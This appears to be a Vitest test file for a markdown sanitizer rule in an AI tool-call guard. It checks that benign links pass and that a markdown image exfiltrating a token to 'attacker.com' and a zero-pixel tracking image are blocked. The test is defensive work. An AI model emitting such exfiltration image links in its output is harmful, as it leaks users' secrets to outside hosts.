import { describe, it, expect } from 'vitest';
import { createMarkdownAstSanitizerRule } from '../src/armor/markdown_ast_sanitizer.js';
import { Verdict } from '../src/types.js';

describe('MarkdownAstSanitizer', () => {
  const rule = createMarkdownAstSanitizerRule();

  it('allows benign markdown content and valid documentation links', () => {
    const violation = rule.evaluate({
      toolName: 'markdown_render',
      params: { content: '# Overview\n\nCheck [Documentation](https://docs.example.com) for details.' }
    });
    expect(violation).toBeNull();
  });

  it('blocks markdown image exfiltration URLs', () => {
    const violation = rule.evaluate({
      toolName: 'markdown_render',
      params: { content: 'Result: ![data](https://attacker.com/exfil?token=123)' }
    });
    expect(violation).not.toBeNull();
    expect(violation?.verdict).toBe(Verdict.BLOCK);
  });

  it('blocks embedded zero-pixel tracking images', () => {
    const violation = rule.evaluate({
      toolName: 'markdown_render',
      params: { content: '<img src="https://tracker.com/pixel.gif" width="0" height="0" />' }
    });
    expect(violation).not.toBeNull();
    expect(violation?.verdict).toBe(Verdict.BLOCK);
  });
});
